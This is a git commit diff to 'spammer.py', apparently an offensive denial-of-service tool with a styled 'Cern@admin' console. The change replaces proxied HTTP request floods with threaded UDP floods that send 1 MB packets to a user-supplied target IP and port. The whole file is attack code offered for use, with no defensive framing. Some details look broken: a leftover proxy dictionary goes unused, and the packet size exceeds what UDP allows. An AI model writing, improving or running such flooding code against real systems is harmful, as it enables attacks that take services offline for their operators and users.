f5c68d032155a7e21738aa70cd09d440852f4ae0
tae <x1337@taes-Laptop.local>
2024-10-20 18:54:07 +0200

    Updated Udp and added threads

--- spammer.py
+++ spammer.py
@@ -1,8 +1,7 @@
-import requests
+import socket
 import os
 from colorama import Fore
 import platform
-import socket
 from threading import Thread
 
 def clear():
@@ -13,8 +12,6 @@ def clear():
 
 def dos():
     clear()
-    print("Cern@admin-[$]> Enter Proxies Type")
-    proxytype = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
     print("Cern@admin-[$]> Enter Target IP ")
     ip = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
     print("Cern@admin-[$]> Enter Target Port ")
@@ -29,20 +26,22 @@ def dos():
             with open("proxy.txt", "r") as file:
                 proxy = file.read().strip()
                 proxies = {
-                'http': f'{proxytype}://{proxy}',
-                'https': f'{proxytype}://{proxy}'
+                'http': f'socks4://{proxy}',
+                'https': f'socks5://{proxy}'
             }
             for _ in range(int(length)):
                 try:
-                    payload = 'A' * 1048576  
-                    requests.get(f"http://{ip}:{port}",data=payload, proxies=proxies, timeout=6)
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.settimeout(6)
+                    sock.sendto(b'A' * 1048576, (ip, int(port)))
                     print(f"Cern@admin-[$]> Sent request to {ip} on port {port}")
                 except:
                     print(f"Cern@admin-[$]> Failed to send request to {ip} on port {port}")
+                finally:
+                    sock.close()
     threads_list = []
     for _ in range(int(threads)):
         t = Thread(target=singlerequest)
         threads_list.append(t)
         t.start()
-
 
